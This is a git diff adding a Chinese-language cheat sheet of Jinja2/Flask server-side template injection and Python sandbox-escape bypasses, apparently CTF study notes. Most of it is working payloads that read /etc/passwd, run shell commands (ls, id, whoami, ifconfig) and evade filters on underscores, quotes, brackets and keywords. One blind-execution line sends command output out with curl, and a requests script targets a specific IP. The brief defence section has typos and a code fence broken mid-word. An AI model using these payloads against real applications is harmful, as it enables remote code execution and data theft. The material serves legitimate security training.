@@ -190,9 +190,244 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['popen']('base64 /tmp/www.tar.gz').read()
 ```
 ## **花式绕过总结**
-### 绕过空格
 
-###
+### 绕过空格
+```python
+{(''|attr('__class__')}}，{(''['__class__'])}}
+# 等价于
+{{''.__class__}}
+• 空格可以用tab(%09)绕过
+• | 后不允许接a-z可以用%0c，tab等绕过
+• os可以通过python中exec绕过
+如果过滤仅限于 request.args 但是不允许 post，简单的办法是可以用request.cookies来绕过
+```
+### 绕过[]
+```python
+pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。
+>>> ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
+
+使用 `__getitem__` `pop`
+
+读文件：
+''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
+
+执行命令：
+''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()
+
+request.cookies["hh"]  ——> request.cookies.getitem("hh")
+```
+### 绕过引号
+```
+request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤
+{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
+
+先获取chr函数，赋值给chr，后面拼接字符串就好了：
+
+{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() }}
+
+借助request对象(推荐)：
+
+`request.args` 是flask中的一个属性,为返回请求的参数,这里把`path`当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。
+
+{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd
+
+执行命令：
+{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
+
+{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id
+
+特别说明的是 chr 是没有办法在jinjia2模板中调用的。因为在沙盒中这个函数是不存在的。
+
+我们可以使用数字列表转化成字节流， 之后转化成字符串的方法。
+
+利用bytes， 但是 python3和 python2略有不同
+
+# python3
+
+In [156]: bytes([49, 43, 49])
+Out[156]: b'1+1'
+
+In [157]: eval(bytes([49, 43, 49]))
+Out[157]: 2
+
+</code></pre>
+
+py3利用：
+
+from jinja2 import Template
+
+attack_str = '__import__("sys").version'
+attack_list = [ord(i) for i in attack]
+attack_input='{{' + '[].__class__.__base__.__subclasses__()[166].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]({attack_list}))'.format(attack_list=attack_list) + '}}'
+
+print(attack_input)
+#output {{[].__class__.__base__.__subclasses__()[166].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]))}}
+
+Template('{user_input}'.format(user_input=attack_input)).render()
+
+#output '3.6.1 (default, Mar 23 2017, 16:49:06) \n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)]'
+
+py2利用
+
+python2 的catch_warnings在59的位置， 另外 python2 的 eval 不接受字节流， 需要特别调用`__str__`方法来转化成字符串。其余和 python3相同。
+Template('{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]).__str__())}}').render()
+
+#output u'2.7.10 (default, Feb  6 2017, 23:53:20) \n[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]'
+
+```
+### 绕过下划线
+```
+同样利用request.args属性
+
+{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
+
+将其中的request.args改为request.values则利用post的方式进行传参
+GET: {{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]('/etc/passwd').read() }} 
+POST: class=__class__&mro=__mro__&subclasses=__subclasses__
+爆破
+text={% if request.values.e[18] == ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()[0]%}good{%endif%}&a=__class__&b=__base__&c=__subclasses__&d=/flag&e=}-{0123456789abcdefghijklmnopqrstuvwxyz
+```
+### 绕过关键字过滤
+```
+base64编码绕过
+__getattribute__使用实例访问属性时,调用该方法
+例如被过滤掉__class__关键词
+{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
+
+字符串拼接绕过
+{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}
+
+当要调用对象的方法如下
+1	>>> dir([]).__class__
+2	<type 'list'>
+3	>>> [].__class__
+4	<type 'list'>
+5	>>> dir([])['__class__']
+但是flask和django的模板注入还有一种内置方法
+1	request.__class__ 效果等于 request|attr('__class__')
+通过参数引入字符串
+1	/?secret={{request.args.class.join((request.args.usc*2,request.args.usc*2))}}&usc=_&class=class
+通过设定变量提前创建好变量
+1	/?secret={%set%09class=request.args.class.join((request.args.usc*2,request.args.usc*2))%}{{class}}&usc=_&
+```
+### 过滤双下划线__
+```python
+同样利用`request.args`属性
+{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
+
+题目练习：文尾参考3中的*QCTF-Confustion1*
+```
+### 过滤{{
+```python
+可以利用{%%}标记
+
+{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
+
+相当于盲命令执行，利用curl将执行结果带出来
+
+如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来
+
+{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}~p0~{% endif %}
+```
+### 借助request绕过
+```python
+大概的原理是这样的，一般检查的时候只是检查url链接中的关键字，并没有对参数和cookies进行检查，那么我们就可以使用变量和数值的方法，url中使用变量代替我们的关键字，在参数中将实际的值附上，代码和讲解如下：
+
+第一个是关于request的有关知识，我们知道这是一个用于web请求的库，它是存在有关参数的用法的，在《Flask request获取参数问题》一文中曾经提到过，分别通过3中方式获取参数:request.form, request.args,request.values
+
+request.form.get("key", type=str, default=None) 获取表单数据
+ 
+request.args.get("key") 获取get请求参数
+ 
+request.values.get("key") 获取所有参数
+
+
+毫无疑问如果要用魔法函数，那么必须就要使用`_`
+ jinja2模板中有很多有用的内置过滤器，可以[“看看这”](http://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters)这里我要介绍的是`attr`和`join`这两个过滤器。`{{request|attr("get")}}`就相当于`{{request.get}}`。`{{request|attr(["_"*2,"class","_"*2]|join)}}`相当于`{{request.__class__}}` 但是我们这样似乎还是无法过滤`_` ，因为还是要输入才行呀。不过，我们前面讲过，被过滤的关键字和字符我们可以从`request`里取出，我们可以在get、post、header、cookies里传一个值，然后用`request.cookies['var']`获取。
+
+import requests
+# 注意是两对{}，上文已经讲过为什么了，这里用的是cookies的方式
+url = '''http://47.96.118.255:2333/{{''[request.cookies.a][request.cookies.b][2][request.cookies.c]()[40]('a.php')[request.cookies.d]()}}'''
+cookies = {}
+cookies['a'] = '__class__'
+cookies['b'] = '__mro__'
+cookies['c'] = '__subclasses__'
+cookies['d'] = 'read'
+print requests.get(url,cookies=cookies).text
+
+当然，我们也可以构造get的参数来传递：
+
+www.a.com/login.php{{''[request.args.clas][request.args.mr][2][request.args.subclas]()[40]('a.php').__getattribute__('rea'+'d')()}}
+?clas=__class__&mr=__mro__&subclas=__subclasse__
+
+理论上，可以用这种方法绕过任何关键字过滤。更多请见参考5。
+```
+### base64编码绕过
+```
+`__getattribute__`使用实例访问属性时,调用该方法
+
+例如被过滤掉`__class__`关键词
+
+{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
+```
+### 字符串拼接绕过
+```python
+{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}
+
+{{''['__c'+'lass__'].__base__.__subclasses__()[40]("/etc/passwd").read()}}
+```
+### 字符串翻转绕过
+```python
+().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['lave'[::-1]]("__import__('so'[::-1]).system('whoami')")
+    
+().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['lave'[::-1]]("__import__('so'[::-1]).system('whoami')")   
+```
+### 模块删除绕过
+```python
+注意一种简单题型，出题者只做了如下一些处理：
+
+>>> del __builtins__.__dict__['__import__'] # __import__ is the function called by the import statement
+>>> del __builtins__.__dict__['eval'] # evaluating code could be dangerous
+>>> del __builtins__.__dict__['execfile'] # likewise for executing the contents of a file
+>>> del __builtins__.__dict__['input'] # Getting user input and evaluating it might be dangerous
+
+看起来好像已经非常安全是么？但是，`reload(module)` 重新加载导入的模块，并执行代码 即可。但是,`reload`也是`__builtins__`下面的函数,如果直接把它干掉,就没办法重新引入了。这个时候,我们该怎么呢
+在python中,有一个模块叫做imp,是有关引入的一个模块
+我们可以使用
+
+import imp
+imp.reload(__builtins__)
+结果：
+<module '__builtin__' (built-in)>
+
+然后我们就会重新得到完整的`__builtin__`模块了。
+
+导入模块的方式：
+
+- 最直接的import
+
+- 内置函数 `__import__`
+
+  以commands模块为例:
+  
+  f3ck = __import__("pbzznaqf".decode('rot_13'))
+  print f3ck.getoutput('ifconfig')
+ 
+- importlib库
+  以co```pythonmmands模块为例:
+
+  import importlib
+  f3ck = importlib.import_module("pbzznaqf".decode('rot_13 ```')
+  print f3ck.getoutput('ifconfig')
+```
+### 防御方法
+```python
+SSTI（服务端模板注入）。通过 SSTI 控制 Web 应用渲染模板（基于 Jinja2）内容，可以轻易的进行远程代码（命令）执行。当然了，一切的前提都是模板内容可控，虽然这种场景并不常见，但难免会有程序员疏忽会有特殊的需求会让用户控制模板的一些内容。
+在 Jinja2 模板中防止利用 Python 特性执行任意代码，可以使用 Jinja2 自带的沙盒环境 jinja2.sandbox.SandboxedEnvironment，Jinja2 默认沙盒环境在解析模板内容时会检查所操作的变量属性，对于未注册的变量属性访问都会抛出错误
+from jinja2.sandbox import SandboxEnviroment
+env = SandboxedEnviroment()
+env.from_string("模板内容，参数")
+```
 
 ## 参考资料
 【Escaping the Python Sandbox】https://zolmeister.com/2013/05/escaping-python-sandbox.html<br>
